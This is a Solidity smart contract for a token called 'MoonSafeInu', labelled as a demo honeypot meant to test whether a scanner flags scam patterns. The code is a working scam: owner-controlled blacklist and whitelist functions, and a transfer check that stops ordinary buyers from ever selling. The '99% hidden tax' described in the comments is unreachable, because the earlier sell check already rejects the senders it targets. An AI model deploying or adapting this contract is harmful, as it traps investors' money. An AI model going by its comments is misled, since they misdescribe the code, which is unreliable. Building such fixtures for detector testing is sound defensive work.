// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// DEMO: Honeypot / scam token. Buyers can receive but only the owner-whitelisted
// addresses can sell. Hidden 99% transfer tax on non-whitelisted senders.
// ContractLens should flag: blacklist function, hidden tax, owner-only sell gate.

contract ScamToken {
    string public constant name = "MoonSafeInu";
    string public constant symbol = "MSI";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;

    address public owner;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public canSell;     // hidden whitelist
    mapping(address => bool) public blacklisted; // hidden blacklist

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        owner = msg.sender;
        totalSupply = 1_000_000_000 ether;
        balanceOf[msg.sender] = totalSupply;
        canSell[msg.sender] = true;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function setBlacklist(address user, bool flag) external {
        require(msg.sender == owner, "only owner");
        blacklisted[user] = flag;
    }

    function allowSell(address user) external {
        require(msg.sender == owner, "only owner");
        canSell[user] = true;
    }

    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transfer(address to, uint256 value) external returns (bool) {
        return _transfer(msg.sender, to, value);
    }

    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        require(allowance[from][msg.sender] >= value, "allowance");
        allowance[from][msg.sender] -= value;
        return _transfer(from, to, value);
    }

    function _transfer(address from, address to, uint256 value) internal returns (bool) {
        require(!blacklisted[from] && !blacklisted[to], "blacklisted");
        // Honeypot: outsiders cannot sell back
        require(canSell[from] || from == owner, "cannot sell yet");

        // Hidden 99% tax burned to owner on non-whitelisted senders
        uint256 tax = canSell[from] ? 0 : (value * 99) / 100;
        uint256 net = value - tax;

        require(balanceOf[from] >= value, "balance");
        balanceOf[from] -= value;
        balanceOf[to] += net;
        balanceOf[owner] += tax;

        emit Transfer(from, to, net);
        if (tax > 0) emit Transfer(from, owner, tax);
        return true;
    }
}
